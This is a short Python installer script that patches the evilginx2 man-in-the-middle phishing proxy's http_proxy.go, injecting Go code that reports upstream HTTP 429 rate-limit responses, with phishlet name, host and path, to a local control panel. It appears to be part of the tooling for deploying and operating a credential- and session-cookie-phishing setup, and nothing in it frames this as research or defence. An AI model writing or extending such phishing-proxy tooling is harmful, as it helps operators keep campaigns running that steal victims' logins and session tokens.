#!/usr/bin/env python3
"""Patch evilginx2 core/http_proxy.go so origin HTTP 429 is POSTed to the panel.

Used by the installer after git clone, before go build. Idempotent.
"""
from __future__ import annotations

import sys
from pathlib import Path

NEEDLE = "\t\t\t\tauth_tokens = pl.cookieAuthTokens\n\t\t\t}"
HOOK = (
    NEEDLE
    + "\n"
    + "\t\t\tif resp.StatusCode == 429 && pl != nil {\n"
    + "\t\t\t\tgo func(phishlet, host, path string) {\n"
    + "\t\t\t\t\tbody := fmt.Sprintf(`{\"phishlet\":\"%s\",\"host\":\"%s\",\"path\":\"%s\"}`, phishlet, host, path)\n"
    + "\t\t\t\t\treq, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8443/api/internal/egx-429\", strings.NewReader(body))\n"
    + "\t\t\t\t\tif req != nil {\n"
    + "\t\t\t\t\t\treq.Header.Set(\"Content-Type\", \"application/json\")\n"
    + "\t\t\t\t\t\tclient := &http.Client{Timeout: 5 * time.Second}\n"
    + "\t\t\t\t\t\tclient.Do(req)\n"
    + "\t\t\t\t\t}\n"
    + "\t\t\t\t}(pl.Name, req_hostname, resp.Request.URL.Path)\n"
    + "\t\t\t}"
)


def main() -> int:
    if len(sys.argv) < 2:
        print("usage: apply_egx_429_hook.py /root/evilginx2/core/http_proxy.go")
        return 2
    path = Path(sys.argv[1])
    if not path.is_file():
        print("missing", path)
        return 1
    text = path.read_text(encoding="utf-8", errors="replace")
    if "egx-429" in text:
        print("already patched")
        return 0
    if NEEDLE not in text:
        print("needle not found — evilginx2 http_proxy.go changed, cannot apply 429 hook")
        return 1
    path.write_text(text.replace(NEEDLE, HOOK, 1), encoding="utf-8")
    if "egx-429" not in path.read_text(encoding="utf-8", errors="replace"):
        print("patch wrote but egx-429 still missing")
        return 1
    print("patched")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
